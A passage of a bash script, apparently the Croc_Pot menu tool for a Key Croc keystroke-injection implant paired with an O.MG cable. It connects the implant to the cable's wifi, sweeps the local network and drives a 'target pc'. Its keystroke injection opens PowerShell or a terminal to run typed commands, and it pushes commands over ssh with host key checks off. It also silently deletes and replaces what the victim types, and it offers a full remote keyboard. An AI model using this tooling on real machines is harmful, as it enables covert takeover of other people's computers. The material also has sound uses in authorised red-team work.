the usb-A female coupler plug one of the usb-A to usb-C adapter
then plug in the usb-C inactive end of the O.MG cable.
The other usb-A to usb-C adapter is plugged into the keycroc
plug the active end of the O.MG cable into the keycroc and
plug the keycroc into target pc

-On a remote device connect to O.MG wifi access point
start web browser enter http://192.168.4.1 to open O.MG web UI
on same device open a terminal start ssh session with keycroc
IP should be 192.168.4.2 or 192.168.4.3')\n\n"
##
#----O.MG scan for O.MG wifi access point
##
if [ -e "${omg_v}" ]; then
	local scan_ssid=$(iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n 's/.*\('$(sed -n 1p ${omg_v})'\).*/\1/p')
	if [ "$(sed -n 1p ${omg_v})" = "${scan_ssid}" ]; then
		iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'$(sed -n 1p ${omg_v})'/p'
		echo -ne "${green}O.MG wifi access point online${clear}\n"
	else
		echo -ne "${red}O.MG wifi access point offline${clear}\n"
		iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
	fi
else
	read_all ENTER O.MG SSID AND PRESS [ENTER]
	local scan_ssid=$(iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n 's/.*\('${r_a}'\).*/\1/p')
	if [ "${r_a}" = "${scan_ssid}" ]; then
		iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'${r_a}'/p'
		echo -ne "${green}O.MG wifi access point online${clear}\n"
	else
		echo -ne "${red}O.MG wifi access point offline${clear}\n"
		iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
	fi
fi
##
#----O.MG start connection, connect keycroc to O.MG wifi ap
##
	read_all START CONNECTION Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	if [ -e "${omg_v}" ]; then
		echo -ne "${yellow}FOUND EXISTING O.MG WIFI CREDENTIALS${clear}\n"
		iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'$(sed -n 1p ${omg_v})'/p'
		read_all USE EXISTING O.MG CREDENTIALS AND CONNECT Y/N AND PRESS [ENTER]
		case $r_a in
		[yY] | [yY][eE][sS])
			echo -ne "${yellow}Editing the keycroc config file to O.MG WIFI credentials${clear}\n"
			sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID '$(sed -n 1p ${omg_v})'\nWIFI_PASS '$(sed -n 2p ${omg_v})'\nSSH ENABLE' /root/udisk/config.txt
			LED G
			echo -ne "${green}Keycroc is now config to O.MG unplug keycroc and plug back in${clear}\n" ;;
		[nN] | [nN][oO])
			rm ${omg_v}
			read_all ENTER O.MG SSID AND PRESS [ENTER] ; echo "${r_a}" >> ${omg_v}
			echo -ne "${yellow}Checking for O.MG wifi access point ${clear}\n"
			iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
			echo -ne "$(ColorYellow 'ENTER O.MG WIFI CREDENTIALS')\n"
			user_input_passwd ${omg_v} O.MG_WIFI
			echo -ne "${yellow}Editing the keycroc config file to O.MG WIFI credentials${clear}\n"
			sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID '$(sed -n 1p ${omg_v})'\nWIFI_PASS '$(sed -n 2p ${omg_v})'\nSSH ENABLE' /root/udisk/config.txt
			LED G
			echo -ne "${green}Keycroc is now config to O.MG unplug keycroc and plug back in${clear}\n" ;;
		*)
			invalid_entry ; omg_wifi ;;
		esac
	else
		echo -ne "${red}DID NOT FOUND ANY EXISTING O.MG WIFI CREDENTIALS${clear}\n"
		read_all CONNECT KEYCROC TO O.MG CABLE WIFI ACCESS POINT Y/N AND PRESS [ENTER]
		case $r_a in
		[yY] | [yY][eE][sS])
			echo -ne "${yellow}Checking for O.MG wifi access point ${clear}\n"
			iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
			echo -ne "$(ColorYellow 'ENTER O.MG WIFI CREDENTIALS')\n"
			read_all ENTER O.MG SSID AND PRESS [ENTER] ; echo "${r_a}" >> ${omg_v}
			user_input_passwd ${omg_v} O.MG_WIFI
			echo -ne "${yellow}Editing the keycroc config file to O.MG WIFI credentials${clear}\n"
			sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID '$(sed -n 1p ${omg_v})'\nWIFI_PASS '$(sed -n 2p ${omg_v})'\nSSH ENABLE' /root/udisk/config.txt
			LED G
			echo -ne "${green}Keycroc is now config to O.MG unplug keycroc and plug back in${clear}\n" ;;
		[nN] | [nN][oO])
			echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
		*)
			invalid_entry ; omg_wifi ;;
		esac
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; omg_wifi ;;
esac
}
##
#----O.MG start O.MG web UI
##
omg_web() {
	clear
	echo -ne "$(Info_Screen '
-Open target pc web browser and start O.MG web UI
-Ensure target pc is connected to O.MG wifi access point first')\n\n"
read_all START O.MG WEB UI Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	start_web http://192.168.4.1 ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; omg_web ;;
esac
}
##
#----O.MG wifi access point payload
##
omg_quick_connect() {
	clear
	echo -ne "$(Info_Screen '
-Create payload to connect Quickly to O.MG wifi access point
Select # 3 WIFI SETUP PAYLOAD to create payload')\n\n"
read_all CREATE PAYLOAD FOR O.MG QUICK CONNECT AP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	install_payloads ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; omg_quick_connect ;;
esac
}
##
#----O.MG check local network for O.MG cable
##
omg_check() {
	clear
	echo -ne "$(Info_Screen '
-Check local network for O.MG cable
-Ensure O.MG is connected to same local network as Keycroc')\n\n"
##
#----Ping entire network Check local network for O.MG cable
##
	read_all SCAN FOR O.MG CABLE Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
	unset -f ping_alert && killall tcpdump 2> /dev/null
	for omg in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$omg >/dev/null && echo "$t_ip$omg" &) ;done
	arp -a | sed -n 's/\(OMG\)/\1/p'
	local omg_ip=$(arp -a | sed -n 's/\(OMG\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
	if [[ "${omg_ip}" =~ ${validate_ip} ]]; then
		unset -f ping_alert && killall tcpdump 2> /dev/null
		ping -q -c 1 -w 1 ${omg_ip} &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			echo -ne "${red}No O.MG cable detected${clear}\n"
		elif [[ "${#args[@]}" -eq 0 ]]; then
			echo -ne "${yellow}O.MG cable IP:${clear}${green}${omg_ip}${clear}\n"
			read_all START O.MG WEB UI Y/N AND PRESS [ENTER]
			case $r_a in
			[yY] | [yY][eE][sS])
				start_web http://${omg_ip} ;;
			[nN] | [nN][oO])
				echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
			*)
				invalid_entry ; omg_check ;;
			esac
		fi
	else
		echo -ne "${red}No O.MG cable detected${clear}\n"
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; omg_check ;;
esac
}
##
#----O.MG cable Menu
##
MenuTitle O.MG CABLE MENU ; MenuColor 21 1 KEYCROC TO O.MG WIFI ; MenuColor 21 2 START O.MG WEB UI ; MenuColor 21 3 O.MG GITHUB PAGE ; MenuColor 21 4 O.MG AP PAYLOAD ; MenuColor 21 5 O.MG LOCAL NETWORK ; MenuColor 21 6 RETURN TO MAIN MENU ; MenuEnd 24
	case $m_a in
	1) omg_wifi ; omg_cable ;; 2) omg_web ; omg_cable ;; 3) start_web https://github.com/O-MG ; omg_cable ;; 4) omg_quick_connect ;; 5) omg_check ; omg_cable ;; 6) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; omg_cable ;;
	esac
}
##
#----QUACK Explore, Exploring different ways to insert quack command
##
insert_quack() {
	clear
	echo -ne "$(Info_Screen '
-Exploring different ways to run quack command
-More for having remote access to keycroc & Run Croc_Pot remotely
-Send QUACK command and start payloads remotely')\n\n"
##
#----open Target pc terminal Insert Quack command
##
q_terminal() {
	clear
	echo -ne "$(Info_Screen '
-This will open Target pc terminal
-run one Quack command and exit
-Example: type hello world
-hello world should display in terminal and exit')\n\n"
	read_all QUACK COMMAND TARGET TERMINAL Y/N AND PRESS [ENTER]
case $r_a in
	[yY] | [yY][eE][sS])
if [ "$(OS_CHECK)" = WINDOWS ]; then
	read_all ENTER WORD TO QUACK AND PRESS [ENTER]
	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB
else
	case $HOST_CHECK in
	raspberrypi)
		read_all ENTER WORD TO QUACK AND PRESS [ENTER]
		Q CONTROL-ALT-t ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
	$HOST_CHECK)
		read_all ENTER WORD TO QUACK AND PRESS [ENTER]
		Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
	*)
		read_all ENTER WORD TO QUACK AND PRESS [ENTER]
		Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
	esac
fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; q_terminal ;;
esac
}
##
#----Insert Quack command into the SSH command before sending
##
q_ssh() {
	clear
	echo -ne "$(Info_Screen '
-QUACK command into the SSH command before sending
-Need to know target: HOST_NAME, IP, PASSWD
-This will QUACK one command and exit,
-Example:
-ssh host@IP "$(Q STRING "uptime" ; Q ENTER ; Q STRING "exit" ; Q ENTER)"')\n\n"
	read_all SEND QUACK COMMAND OVER SSH Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER TARGET IP AND PRESS [ENTER] ; local T_IP=${r_a}
	if [[ ${T_IP} =~ ${validate_ip} ]]; then
		unset -f ping_alert && killall tcpdump 2> /dev/null
		ping -q -c 1 -w 1 ${T_IP} &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			echo -ne "${red}Unable to reach host${clear}\n"
		elif [[ "${#args[@]}" -eq 0 ]]; then
			read_all ENTER HOST_NAME AND PRESS [ENTER] ; local T_H=${r_a}
			if [ -e /tmp/Q_C.txt ]; then
				local T_W=$(sed -n 1p /tmp/Q_C.txt)
			else
				user_input_passwd /tmp/Q_C.txt TARGET
				local T_W=$(sed -n 1p /tmp/Q_C.txt)
			fi
			echo -ne "${yellow}Example: enter uptime${clear}\n"
			read_all ENTER QUACK COMMAND AND PRESS [ENTER]
			sshpass -p ${T_W} ssh -o "StrictHostKeyChecking no" ${T_H}@${T_IP} "$(Q STRING "${r_a}" ; Q ENTER ; Q STRING "exit" ; Q ENTER)"
		fi
	else
		invalid_entry ; echo -ne "\n${red}Not a valid ip address${clear}\n" ; q_ssh
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; q_ssh ;;
esac
}
##
#----Quack command to target pc
##
q_target() {
	clear
	echo -ne "$(Info_Screen '
-QUACK command to target pc
-This with QUACK two command at target current running application
-This will run in loop, PRESS CONTROL + C TO EXIT
-Example: STRING "hak5"   <-- First QUACK command
          ENTER           <-- Second QUACK command')\n\n"
	read_all START QUACK COMMAND TARGET PC Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	reset_broken
	while true ; do
		if [ $broken -eq 1 ]; then
			LED B
			break
		else
			read_all ENTER FIRST QUACK COMMAND AND PRESS [ENTER] ; local Q_C_A=${r_a}
			read_all ENTER SECOND QUACK COMMAND AND PRESS [ENTER] ; local Q_C_B=${r_a}
			Q ${Q_C_A} ; sleep 1 ; Q ${Q_C_B}
		fi
	done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; q_target ;;
esac
}
##
#----Start payload at remote location enter payload name
##
remote_payload() {
	clear
	echo -ne "$(Info_Screen '
-Start payloads from remote location
-Enter full path of payload name
-PRESS CONTROL + C TO STOP PAYLOAD')\n\n"
	read_all START PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		f=`find /root/udisk/payloads -type f -name "*"` ; echo -ne "${green}${f}${clear}\n"
		read_all ENTER FULL PATH OF PAYLOAD AND PRESS [ENTER]
		${r_a} ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; remote_payload ;;
	esac
}
##
#----Quack Explore replace target characters with input
##
remote_replace() {
	clear
	echo -ne "$(Info_Screen '
-Remotely replace user characters
-This will wait for keyboard activity then wait for inactivity
and then delete and replace user characters
-Enter in characters to be replace')\n"
	read_all START REMOTE REPLACE Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	local i=1
	reset_broken
	while true; do
		LED ATTACK
		read_all ENTER CHARACTERS TO REPLACE AND PRESS [ENTER]
		echo -ne "${yellow}WAITING FOR KEYBOARD ${clear}${cyan}ACTIVITY ${clear}${yellow}COUNT: ${clear}${green}$(( i++ ))${clear}\n\n"
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		echo -ne "${yellow}KEYBOARD IN USE WAITING FOR ${clear}${cyan}INACTIVITY${clear}\n\n"
		WAIT_FOR_KEYBOARD_INACTIVITY 1
		if [ $broken -eq 1 ]; then
			LED OFF
			break
		else
			echo -ne "${yellow}REPLACING USER CHARACTERS WITH: ${clear}${green}${r_a}${clear}\n\n"
			Q CONTROL-SHIFT-LEFTARROW
			Q BACKSPACE
			Q STRING "${r_a}"
			LED B
		fi
	done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; remote_replace ;;
esac
}
##
#----View target pc Keyboard activity or inactivity
##
kb_activity() {
	clear
	echo -ne "$(Info_Screen '
-Indicate if target pc Keyboard is activate or inactivate
-PRESS CTRL + C to break loop in terminal')\n\n"
local i=1
reset_broken
while WAIT_FOR_KEYBOARD_ACTIVITY 0 ; do
	local temp=${spinstr#?}
	if [ $broken -eq 1 ]; then
		break
	else
		echo -ne "\e[40;3$(( $RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")${clear}${yellow}KEYBOARD: ${clear}${green}ACTIVITY ${clear}${yellow}COUNT: ${clear}${green}$((i++))${clear}\033[0K\r"
		local spinstr=$temp${spinstr%"$temp"}
	fi
done &
while WAIT_FOR_KEYBOARD_INACTIVITY 1 ; do
	local temp=${spinstr#?}
	if [ $broken -eq 1 ]; then
		break
	else
		echo -ne "\e[40;3$(( $RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")${clear}${yellow}KEYBOARD: ${clear}${cyan}INACTIVITY ${clear}${yellow}COUNT: ${clear}${green}$((i++))${clear}\033[0K\r"
		local spinstr=$temp${spinstr%"$temp"}
	fi
done
trap - SIGINT
}
##
#----Keycroc Remote keyboard Enter keystroke entry from remote device
##
remote_keyboard() {
	clear
	echo -ne "$(Info_Screen '
-Keycroc Remote keyboard, Enter keystroke entry from remote device

-Start remote ssh session with keycroc then run Croc_Pot with typing
/root/udisk/tools/Croc_Pot.sh select this option and start typing in
remote terminal keystroke entry should display on target pc

NOTE: Not all keystroke entry are working at the moment

-Alternet keystrokes entry
-Press ALT-i will execute (Q GUI i)
-Press ALT-x will execute (Q GUI x)
-Press ALT-0 will execute (Q GUI)
-Press ALT-4 will execute (Q ALT-F4)
-Press ALT-5 will execute (Q GUI r)
-Press ALT-6 will execute (Q GUI d)
-Press ALT-7 will execute (Q GUI l)
-Press ALT-8 will execute (Q CONTROL-ALT-d)
-Press ALT-9 will execute (Q CONTROL-ALT-t)
-Press ALT-z will execute (Q CONTROL-z)
-Press ALT-c will execute (Q ALT-SPACE ; Q c)
-Press ALT-s will execute (Q ALT-SPACE)
-Press ALT-n will execute (Q NUMLOCK)
-Press ALT-l will execute (Q CAPSLOCK)
-Press ALT-p will execute (Q PRINTSCREEN)
-Press ALT-SHIFT-T will execute (Q ALT-TAB)
-Press ALT-SHIFT-E will execute (Q ALT-ESCAPE)
-Press CTRL-t will execute (Q CONTROL-TAB)
-Press F1 to return back to Croc_Pot menu')\n\n"
	read_all START REMOTE KEYBOARD Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	clear
	echo -ne "\n\n\t$(ColorYellow 'KEYCROC REMOTE KEYBOARD ENTER KEYSTROKES HERE')\n\n"
read_key_press() {
if IFS= read -s -r -n1 key_press; then
	while read -sN1 -t 0.001 ; do
		key_press+="${REPLY}"
	done
fi
}
declare -a fnkey
for x in {1..12}; do
	raw=$(tput kf$x | cat -A)
	fnkey[$x]=${raw#^[}
done
while read_key_press; do
printf -v key_code "%d" "'$key_press"
trap ctrl_c SIGINT
ctrl_c() {
	Q CONTROL-c ; echo -ne " CTRL-C "
}
case ${key_press} in
#	$'\e'${fnkey[1]}) Q F1 ; echo -ne " F1 " ;;
	$'\e'${fnkey[1]}) Q F1 ; echo -ne " F1 " ; trap - SIGINT ; break ;;
	$'\e'${fnkey[2]}) Q F2 ; echo -ne " F2 " ;;
	$'\e'${fnkey[3]}) Q F3 ; echo -ne " F3 " ;;
	$'\e'${fnkey[4]}) Q F4 ; echo -ne " F4 " ;;
	$'\e'${fnkey[5]}) Q F5 ; echo -ne " F5 " ;;
	$'\e'${fnkey[6]}) Q F6 ; echo -ne " F6 " ;;
	$'\e'${fnkey[7]}) Q F7 ; echo -ne " F7 " ;;
	$'\e'${fnkey[8]}) Q F8 ; echo -ne " F8 " ;;
	$'\e'${fnkey[9]}) Q F9 ; echo -ne " F9 " ;;
	$'\e'${fnkey[10]}) Q F10 ; echo -ne " F10 " ;;
	$'\e'${fnkey[11]}) Q F11 ; echo -ne " F11 " ;;
	$'\e'${fnkey[12]}) Q F12 ; echo -ne " F12 " ;;
	$'\e[5~') Q KEYCODE 00,00,4b ; echo -ne " PAGEUP " ;;
	$'\e[6~') Q PAGEDOWN ; echo -ne " PAGEDOWN " ;;
	$'\e[2~') Q INSERT ; echo -ne " INSERT " ;;
	$'\e[3~') Q DELETE ; echo -ne " DELETE " ;;
	$'\E[1;2P') Q SHIFT-F1 ; echo -ne " SHIFT-F1 " ;;
	$'\E[1;2Q') Q SHIFT-F2 ; echo -ne " SHIFT-F2 " ;;
	$'\E[1;2R') Q SHIFT-F3 ; echo -ne " SHIFT-F3 " ;;
	$'\E[1;2S') Q SHIFT-F4 ; echo -ne " SHIFT-F4 " ;;
	$'\E[15;2~') Q SHIFT-F5 ; echo -ne " SHIFT-F5 " ;;
	$'\E[17;2~') Q SHIFT-F6 ; echo -ne " SHIFT-F6 " ;;
	$'\E[18;2~') Q SHIFT-F7 ; echo -ne " SHIFT-F7 " ;;
	$'\E[19;2~') Q SHIFT-F8 ; echo -ne " SHIFT-F8 " ;;
	$'\E[20;2~') Q SHIFT-F9 ; echo -ne " SHIFT-F9 " ;;
	$'\E[21;2~') Q SHIFT-F10 ; echo -ne " SHIFT-F10 " ;;
	$'\E[23;2~') Q SHIFT-F11 ; echo -ne " SHIFT-F11 " ;;
	$'\E[24;2~') Q SHIFT-F12 ; echo -ne " SHIFT-F12 " ;;
	$'\e[H') Q HOME ; echo -ne " HOME " ;;
	$'\e[F') Q END ; echo -ne " END " ;;
	$'\033') Q ESCAPE ; echo -ne " ESC " ;;
	$'\E[A') Q UPARROW ; echo -ne " UPARROW " ;;
	$'\E[B') Q DOWNARROW ; echo -ne " DOWNARROW " ;;
	$'\E[C') Q RIGHTARROW ; echo -ne " RIGHTARROW " ;;
	$'\E[D') Q LEFTARROW ; echo -ne " LEFTARROW " ;;
	$'\177') Q BACKSPACE ; echo -ne "\b \b" ;;
	$'\x20') Q KEYCODE 00,00,2c ; echo -ne " " ;;
	$'\e.') Q ALT-. ; echo -ne " ALT-. " ;;
#	$'\e0') Q ALT-0 ; echo -ne " ALT-0 " ;;
	$'\e0') Q GUI ; echo -ne " GUI " ;;
	$'\e1') Q ALT-1 ; echo -ne " ALT-1 " ;;
	$'\e2') Q ALT-2 ; echo -ne " ALT-2 " ;;
	$'\e3') Q ALT-3 ; echo -ne " ALT-3 " ;;
#	$'\e4') Q ALT-4 ; echo -ne " ALT-4 " ;;
	$'\e4') Q ALT-F4 ; echo -ne " ALT-F4 " ;;
#	$'\e5') Q ALT-5 ; echo -ne " ALT-5 " ;;
	$'\e5') Q GUI r ; echo -ne " GUI-R " ;;
#	$'\e6') Q ALT-6 ; echo -ne " ALT-6 " ;;
	$'\e6') Q GUI d ; echo -ne " GUI-D " ;;
#	$'\e7') Q ALT-7 ; echo -ne " ALT-7 " ;;
	$'\e7') Q GUI l ; echo -ne " GUI-L " ;;
#	$'\e8') Q ALT-8 ; echo -ne " ALT-8 " ;;
	$'\e8') Q CONTROL-ALT-d ; echo -ne " CTRL-ALT-D " ;;
#	$'\e9') Q ALT-9 ; echo -ne " ALT-9 " ;;
	$'\e9') Q CONTROL-ALT-t ; echo -ne " CTRL-ALT-T " ;;
	$'\ea') Q ALT-a ; echo -ne " ALT-A " ;;
	$'\eb') Q ALT-b ; echo -ne " ALT-B " ;;
#	$'\ec') Q ALT-c ; echo -ne " ALT-C " ;;
	$'\ec') Q ALT-SPACE ; Q c ; echo -ne " ALT-SPACE-C " ;;
	$'\ed') Q ALT-d ; echo -ne " ALT-D " ;;
	$'\ee') Q ALT-e ; echo -ne " ALT-E " ;;
	$'\ef') Q ALT-f ; echo -ne " ALT-F " ;;
	$'\eg') Q ALT-g ; echo -ne " ALT-G " ;;
	$'\eh') Q ALT-h ; echo -ne " ALT-H " ;;
#	$'\ei') Q ALT-i ; echo -ne " ALT-I " ;;
	$'\ei') Q GUI i ; echo -ne " GUI-I " ;;
	$'\ej') Q ALT j ; echo -ne " ALT-J " ;;
	$'\ek') Q ALT k ; echo -ne " ALT-K " ;;
#	$'\el') Q ALT l ; echo -ne " ALT-L " ;;
	$'\el') Q CAPSLOCK ; echo -ne " CAPSLOCK " ;;
#	$'\en') Q ALT n ; echo -ne " ALT-N " ;;
	$'\en') Q NUMLOCK ; echo -ne " NUMLOCK " ;;
#	$'\ep') Q ALT p ; echo -ne " ALT-N " ;;
	$'\ep') Q PRINTSCREEN ; echo -ne " PRINTSCREEN " ;;
#	$'\e ') Q ALT-SPACE ; echo -ne " ALT-SPACE " ;;
#	$'\es') Q ALT-s ; echo -ne " ALT-S " ;;
	$'\es') Q ALT-SPACE ; echo -ne " ALT-SPACE " ;;
	$'\ev') Q ALT-v ; echo -ne " ALT-V " ;;
#	$'\ex') Q ALT-x ; echo -ne " ALT-X " ;;
	$'\ex') Q GUI x ; echo -ne " GUI-X " ;;
	$'\ey') Q ALT-y ; echo -ne " ALT-Y " ;;
#	$'\ez') Q ALT-z ; echo -ne " ALT-Z " ;;
	$'\ez') Q CONTROL-z ; echo -ne " CTRL-Z " ;;
	$'\eA') Q ALT-SHIFT-a ; echo -ne " ALT-SHIFT-A " ;;
	$'\eB') Q ALT-SHIFT-b ; echo -ne " ALT-SHIFT-B " ;;
	$'\eC') Q ALT-SHIFT-c ; echo -ne " ALT-SHIFT-C " ;;
	$'\eD') Q ALT-SHIFT-d ; echo -ne " ALT-SHIFT-D " ;;
#	$'\e\e') Q ALT-ESCAPE ; echo -ne " ALT-ESC " ;;
#	$'\eE') Q ALT-SHIFT-e ; echo -ne " ALT-SHIFT-E " ;;
	$'\eE') Q ALT-ESCAPE ; echo -ne " ALT-ESC " ;;
	$'\eF') Q ALT-SHIFT-f ; echo -ne " ALT-SHIFT-F " ;;
	$'\eP') Q ALT-SHIFT-p ; echo -ne " ALT-SHIFT-P " ;;
	$'\eW') Q ALT-SHIFT-w ; echo -ne " ALT-SHIFT-W " ;;
	$'\eL') Q ALT-SHIFT-l ; echo -ne " ALT-SHIFT-L " ;;
#	$'\e\t') Q ALT-TAB ; echo -ne " ALT-TAB " ;;
#	$'\eT') Q ALT-SHIFT-t ; echo -ne " ALT-SHIFT-T " ;;
	$'\eT') Q ALT-TAB ; echo -ne " ALT-TAB " ;;
	$'\e[1;3P') Q ALT-F1 ; echo -ne " ALT-F1 " ;;
	$'\e[1;3Q') Q ALT-F2 ; echo -ne " ALT-F2 " ;;
	$'\e[1;3R') Q ALT-F3 ; echo -ne " ALT-F3 " ;;
	$'\e[1;3S') Q ALT-F4 ; echo -ne " ALT-F4 " ;;
	$'\e[15;3~') Q ALT-F5 ; echo -ne " ALT-F5 " ;;
	$'\e[17;3~') Q ALT-F6 ; echo -ne " ALT-F6 " ;;
	$'\e[18;3~') Q ALT-F7 ; echo -ne " ALT-F7 " ;;
	$'\e[19;3~') Q ALT-F8 ; echo -ne " ALT-F8 " ;;
	$'\e[20;3~') Q ALT-F9 ; echo -ne " ALT-F9 " ;;
	$'\e[21;3~') Q ALT-F10 ; echo -ne " ALT-F10 " ;;
	$'\e[23;3~') Q ALT-F11 ; echo -ne " ALT-F11 " ;;
	$'\e[24;3~') Q ALT-F12 ; echo -ne " ALT-F12 " ;;
	$'\e[1;3A') Q ALT-UPARROW ; echo -ne " ALT-UPARROW " ;;
	$'\e[1;3B') Q ALT-DOWNARROW ; echo -ne " ALT-DOWNARROW " ;;
	$'\e[1;3C') Q ALT-RIGHTARROW ; echo -ne " ALT-RIGHTARROW " ;;
	$'\e[1;3D') Q ALT-LEFTARROW ; echo -ne " ALT-LEFTARROW " ;;
	$'\e[1;6A') Q CONTROL-SHIFT-UPARROW ; echo -ne " CTRL-SHIFT-UPARROW " ;;
	$'\e[1;6B') Q CONTROL-SHIFT-DOWNARROW ; echo -ne " CTRL-SHIFT-DOWNARROW " ;;
	$'\e[1;6C') Q CONTROL-SHIFT-RIGHTARROW ; echo -ne " CTRL-SHIFT-RIGHTARROW " ;;
	$'\e[1;6D') Q CONTROL-SHIFT-LEFTARROW ; echo -ne " CTRL-SHIFT-LEFTARROW " ;;
	$'\e[1;5A') Q CONTROL-UPARROW ; echo -ne " CTRL-UPARROW " ;;
	$'\e[1;5B') Q CONTROL-DOWNARROW ; echo -ne " CTRL-DOWNARROW " ;;
	$'\e[1;5C') Q CONTROL-RIGHTARROW ; echo -ne " CTRL-RIGHTARROW " ;;
	$'\e[1;5D') Q CONTROL-LEFTARROW ; echo -ne " CTRL-LEFTARROW " ;;
	$'\e[1;2A') Q SHIFT-UPARROW ; echo -ne " SHIFT-UPARROW " ;;
	$'\e[1;2B') Q SHIFT-DOWNARROW ; echo -ne " SHIFT-DOWNARROW " ;;
	$'\e[1;2C') Q SHIFT-RIGHTARROW ; echo -ne " SHIFT-RIGHTARROW " ;;
	$'\e[1;2D') Q SHIFT-LEFTARROW ; echo -ne " SHIFT-LEFTARROW " ;;
	$'\0') Q ENTER ; echo -ne " ENTER \n" ;;
	$'\t') Q TAB ; echo -ne " TAB " ;;
	$'\e[Z') Q SHIFT-TAB ; echo -ne " SHIFT-TAB " ;;
#	$'\x09') Q CONTROL-TAB ; echo -ne " CTRL-TAB " ;;
	[[:graph:]]) Q STRING "$key_press" ; echo -ne "$key_press" ;;
	*)
	case ${key_code} in
		1) Q CONTROL-a ; echo -ne " CTRL-A " ;;
		2) Q CONTROL-b ; echo -ne " CTRL-B " ;;
		4) Q CONTROL-d ; echo -ne " CTRL-D " ;;
		5) Q CONTROL-e ; echo -ne " CTRL-E " ;;
		6) Q CONTROL-f ; echo -ne " CTRL-F " ;;
		7) Q CONTROL-g ; echo -ne " CTRL-G " ;;
		8) Q CONTROL-h ; echo -ne " CTRL-H " ;;
		10) Q CONTROL-j ; echo -ne " CTRL-J " ;;
		11) Q CONTROL-k ; echo -ne " CTRL-K " ;;
		12) Q CONTROL-l ; echo -ne " CTRL-L " ;;
		13) Q CONTROL-m ; echo -ne " CTRL-M " ;;
		14) Q CONTROL-n ; echo -ne " CTRL-N " ;;
